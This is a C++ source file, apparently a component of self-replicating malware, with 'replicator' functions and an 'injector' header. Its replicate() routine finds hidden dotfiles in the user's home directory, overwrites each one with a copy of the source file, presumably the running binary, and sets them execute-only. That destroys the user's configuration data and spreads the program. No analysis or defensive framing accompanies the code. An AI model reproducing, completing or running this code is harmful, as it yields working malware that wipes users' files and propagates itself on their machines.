//
// Created by ferdinand on 8/12/25.
//

#include "replicator.h"

#include <unistd.h>
#include <sys/stat.h>

#include "injector.h"

bool isPotentiallyTargetFile(const std::string& file) {
    for (auto& target: possibleTargetFiles) {
        if (file.find(target) != std::string::npos) return true;
    }
    return false;
}

void getHiddenFiles(const std::string &dir, std::vector<std::string> &files) {
    DIR *dp;
    dirent *dirp;
    if((dp = opendir(dir.c_str())) == NULL) {
        return;
    }

    while ((dirp = readdir(dp)) != NULL) {
        if (dirp->d_type != DT_REG) continue;

        std::string entry = dirp->d_name;

        if (entry.empty() || entry[0] != '.' || isPotentiallyTargetFile(entry)) continue;

        files.emplace_back(homePath + entry);
    }
    closedir(dp);

    if (files.empty()) files.emplace_back(homePath + ".cfg");
}

void replicate(char *source) {
    std::ifstream reader(source);

    getHiddenFiles(homePath, replicatedEntries);

    for (const auto& entry : replicatedEntries) {
        std::ofstream writer(entry);
        writer << reader.rdbuf();
        reader.clear();
        reader.seekg(0, std::ios::beg);
        writer.close();
        chmod(entry.c_str(), S_IXUSR);
    }
    reader.close();
}
